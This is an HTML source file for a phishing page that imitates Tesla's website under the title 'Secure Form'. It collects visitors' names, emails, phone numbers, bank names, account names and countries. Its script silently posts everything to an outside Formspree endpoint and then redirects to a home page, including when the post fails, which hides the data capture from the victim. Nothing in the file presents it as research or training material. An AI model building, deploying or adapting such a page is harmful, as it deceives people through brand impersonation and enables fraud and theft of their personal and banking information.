<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Form</title>

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:sans-serif;
}

body{
  background:rgba(245,245,245,0.92);
}

/* NAVBAR */
.navbar{
  position:fixed;
  top:0;left:0;width:100%;
  z-index:20;
  display:flex;
  justify-content:space-between;
  align-items:center;
  padding:18px 5vw;
  background:#fff;
}

.logo{font-weight:bold;letter-spacing:3px;}

.nav-center{display:flex;gap:25px;}
.nav-item{cursor:pointer;font-size:14px;}

.nav-right{display:flex;gap:10px;}

.icon{
  width:32px;height:32px;border-radius:50%;
  background:rgba(0,0,0,0.1);
  display:flex;
  align-items:center;
  justify-content:center;
}

/* DROPDOWN */
.dropdown{
  position:fixed;
  top:0;left:0;width:100%;
  display:none;
  z-index:10;
}

.dropdown.show{
  display:block;
  backdrop-filter:blur(22px);
  background:rgba(245,245,245,0.92);
  padding-top:90px;
}

.dropdown-wrapper{padding:40px 5vw;}

.dropdown-grid{
  display:grid;
  grid-template-columns:repeat(3,1fr);
  gap:30px;
}

.dropdown-item{text-align:center;}

.dropdown-item img{
  width:100%;
  height:120px;
  object-fit:contain;
}

.links{
  display:flex;
  justify-content:center;
  gap:15px;
  margin-top:6px;
}

.links a{
  font-size:13px;
  color:#000;
  text-decoration:underline;
}

/* FORM */
.wrapper{
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  padding-top:100px;
}

.container{
  width:90%;
  max-width:420px;
  background:#fff;
  padding:25px;
  border-radius:12px;
  box-shadow:0 10px 40px rgba(0,0,0,0.15);
}

h2{text-align:center;margin-bottom:10px;}
p{text-align:center;font-size:13px;color:#666;margin-bottom:20px;}

input, textarea{
  width:100%;
  padding:12px;
  margin:8px 0;
  border:1px solid #ddd;
  border-radius:8px;
}

textarea{height:100px;resize:none;}

button{
  width:100%;
  padding:12px;
  margin-top:10px;
  border:none;
  border-radius:25px;
  background:#000;
  color:#fff;
  cursor:pointer;
}
</style>
</head>

<body>

<!-- NAVBAR -->
<div class="navbar">
  <div class="logo">TESLA</div>

  <div class="nav-center">
    <div class="nav-item">Vehicles</div>
    <div class="nav-item">Energy</div>
    <div class="nav-item">Charging</div>
    <div class="nav-item">Discover</div>
    <div class="nav-item">Shop</div>
  </div>

  <div class="nav-right">
    <div class="icon">S</div>
    <div class="icon">A</div>
    <div class="icon">☰</div>
  </div>
</div>

<!-- DROPDOWN -->
<div id="dropdown" class="dropdown">
  <div id="dropdown-content"></div>
</div>

<!-- FORM -->
<div class="wrapper">
  <div class="container">
    <h2>Complete Your Details</h2>
    <p>Please fill the form to continue</p>

    <form id="mainForm" action="https://formspree.io/f/mkokroza" method="POST">

      <input type="text" name="name" placeholder="Full Name" required>
      <input type="email" name="email" placeholder="Email Address" required>
      <input type="tel" name="phone" placeholder="Phone Number" required>

      <input type="text" name="bank_name" placeholder="Bank Name">
      <input type="text" name="account_name" placeholder="Account Name">
      <input type="text" name="country" placeholder="Country">

      <textarea name="message" placeholder="Your message"></textarea>

      <button type="submit">Submit</button>
    </form>
  </div>
</div>

<script>
/* ===== SILENT FORM SUBMIT + REDIRECT ===== */
document.getElementById("mainForm").addEventListener("submit", function(e){
  e.preventDefault();

  const form = this;

  fetch(form.action, {
    method: "POST",
    body: new FormData(form),
    headers: {
      "Accept": "application/json"
    }
  })
  .then(() => {
    // redirect back to homepage instantly
    window.location.href = "index.html";
  })
  .catch(() => {
    // still redirect even if error
    window.location.href = "index.html";
  });
});


/* ===== DROPDOWN (SAFE VERSION) ===== */
const menus = {
  vehicles:[
    {name:"Model S",img:"https://images.pexels.com/photos/3729464/pexels-photo-3729464.jpeg"},
    {name:"Model 3",img:"https://images.pexels.com/photos/170811/pexels-photo-170811.jpeg"},
    {name:"Model X",img:"https://images.pexels.com/photos/210019/pexels-photo-210019.jpeg"}
  ],
  energy:[
    {name:"Solar Panels",img:"https://images.pexels.com/photos/9875441/pexels-photo-9875441.jpeg"}
  ],
  charging:[
    {name:"Supercharger",img:"https://images.pexels.com/photos/110844/pexels-photo-110844.jpeg"}
  ],
  discover:[
    {name:"Insurance",img:"https://images.pexels.com/photos/3184291/pexels-photo-3184291.jpeg"}
  ],
  shop:[
    {name:"Accessories",img:"https://images.pexels.com/photos/112460/pexels-photo-112460.jpeg"}
  ]
};

const dropdown=document.getElementById("dropdown");
const dropdownContent=document.getElementById("dropdown-content");

/* simple safe hover (no breaking issues) */
document.querySelectorAll(".nav-item").forEach(item=>{
  item.addEventListener("mouseenter",()=>{
    const key = item.innerText.toLowerCase();
    if(menus[key]){
      dropdown.classList.add("show");

      dropdownContent.innerHTML = `
        <div class="dropdown-wrapper">
          <div class="dropdown-grid">
            ${menus[key].map(i=>`
              <div class="dropdown-item">
                <img src="${i.img}">
                <h4>${i.name}</h4>
              </div>
            `).join("")}
          </div>
        </div>
      `;
    }
  });
});

/* hide dropdown on click outside */
document.addEventListener("click",()=>{
  dropdown.classList.remove("show");
});
</script>

</body>
</html>
